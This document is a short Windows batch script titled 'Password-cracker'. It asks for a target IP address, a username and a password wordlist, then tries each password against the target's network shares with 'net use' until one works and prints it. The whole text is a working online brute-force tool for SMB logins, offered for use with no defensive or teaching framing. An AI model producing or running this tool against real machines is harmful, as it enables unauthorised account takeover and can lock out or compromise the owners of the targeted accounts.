@echo off
title Password-cracker
color a

set /p ip="User ip address: "
set /p user="UserName: "
set /p passlist="password list (txt name): "

set /a count=0
for /f %%a in (%passlist%) do (
set pass=%%a
call :attempt
)
echo Password not found
pause
exit

:success
echo Password Found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
